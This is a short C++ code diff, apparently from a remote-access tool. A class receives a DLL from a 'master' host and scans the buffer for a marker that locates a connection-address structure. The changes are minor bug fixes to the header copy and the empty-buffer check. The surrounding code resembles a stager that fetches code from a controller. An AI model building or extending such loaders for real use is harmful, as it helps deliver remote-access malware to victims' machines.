@@ -108,7 +108,7 @@ typedef struct PkgHeader {
 	int originLen;
 	PkgHeader(int size) {
 		memset(flag, 0, sizeof(flag));
-		strcpy_s(flag, "Hello?");
+		memcpy(flag, "Hello?", 6);
 		originLen = size;
 		totalLen = sizeof(PkgHeader) + size;
 	}
@@ -214,11 +214,13 @@ public:
 		return buffer;
 	}
 	// Request DLL from the master.
-	virtual void* LoadLibraryA(const char* path, int len=0) {
+	virtual void* LoadLibraryA(const char* path, int len = 0) {
 		int size = 0;
 		auto buffer = ReceiveDll(size);
-		if (nullptr == buffer)
+		if (nullptr == buffer || size == 0){
+			SAFE_DELETE_ARRAY(buffer);
 			return nullptr;
+		}
 		int pos = MemoryFind(buffer, FLAG_FINDEN, size, sizeof(FLAG_FINDEN) - 1);
 		if (-1 != pos) {
 			CONNECT_ADDRESS* addr = (CONNECT_ADDRESS*)(buffer + pos);
